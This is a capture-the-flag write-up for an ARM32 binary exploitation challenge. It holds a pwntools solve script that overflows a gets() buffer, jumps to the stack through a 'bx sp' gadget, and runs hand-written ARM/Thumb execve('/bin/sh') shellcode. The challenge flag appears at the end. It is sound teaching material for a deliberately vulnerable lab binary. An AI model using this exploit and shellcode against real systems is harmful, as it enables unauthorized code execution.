# ARM32

**`Authors:`** [m0kr4n3](https://github.com/m0kr4n3) & [LaidMalik](https://github.com/malikDaCoda)

## Description

> Imagine a binary exploitation challenge with no ASLR, no PIE, RWX segments... but it runs on ARM! Should be fun, right?  
> Note: the binary is run using qemu-arm (qemu-user).

## Write-up

### Brief Summary

- all protections are disabled (no ASLR, no PIE, XN disabled, ...)
- `gets` is used in the vulnerable function `vuln`
- there are a bunch of ways to get a shell :
  - place execve shellcode on the stack and branch to it
  - ret2libc with ROP to execute system("/bin/sh")

### TODO

### Solve script (with comments)

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./challenge/arm32")

HOST, PORT = "localhost", 1337

context.binary = elf

def main():
    global io

    # padding to reach return address
    # 0x20 for buffer size
    # +4 for frame pointer
    pad = 0x20 + 4

    # gadgets
    # +1 is added because the instructions
    # are in thumb mode
    bx_sp = next(elf.search(
        asm("bx sp", arch="thumb"),
        executable=True
    )) + 1

    io = conn()

    payload = flat(
        "/bin/sh\0",
        # padding to reach return address
        b'A'*(pad-8),
        # branch to sp, where the shellcode will be
        bx_sp,
    )

    context.clear(arch="arm")

    # although `gets` allows null bytes,
    # I think it is good practice to write
    # null-byte free shellcode

    # null-byte free shellcode
    shellcode1 = asm('''
        .code 32            @ ARM mode
        @ switch to thumb mode (unlocks 16-bit instructions)
        @ to avoid null bytes
        add r3, pc, #1
        bx r3

        .code 16            @ Thumb mode
        @ &"/bin/sh" offset calculation:
        @ pad (0x20+4) +
        @ retaddr (4) +
        @ 2 32-bit instructions (2*4) +
        @ 2*2 (pc points two instructions ahead) = 0x34
        sub r0, pc, #0x34   @ filename: &"/bin/sh" (at pc-0x34)
        eors r1, r1         @ argv: NULL
        eors r2, r2         @ envp: NULL
        movs r7, #11        @ execve syscall
        svc #1              @ invoke syscall
        mov r5, r5          @ NOP (shellcode must be 4 bytes aligned)
    ''')

    # simpler shellcode but with null bytes
    shellcode2 = asm('''
        @ &"/bin/sh" offset calculation:
        @ pad (0x20+4) +
        @ retaddr (4) +
        @ 2*4 (pc points two instructions ahead) = 0x30
        sub r0, pc, #0x30   @ filename: &"/bin/sh" (at pc-0x30)
        mov r1, #0          @ argv: NULL
        mov r2, #0          @ envp: NULL
        mov r7, #11         @ execve syscall
        svc #0              @ invoke syscall
    ''')

    # we can also get lazy and use shellcraft
    shellcode3 = asm(shellcraft.arm.execve(b"/bin/sh\0", 0, 0))

    io.recvline()

    payload += shellcode1

    # `gets`  stops reading when encountering a newline
    assert(b'\n' not in payload)
    io.sendline(payload)

    io.interactive()

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        if args.GDB:
            p = process(["qemu-arm-static", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf/", elf.path])
        else:
            p = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabihf/", elf.path])
        return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
```

### Flag

`shellmates{ARM_Xpl0it$_4r3_C00l}`
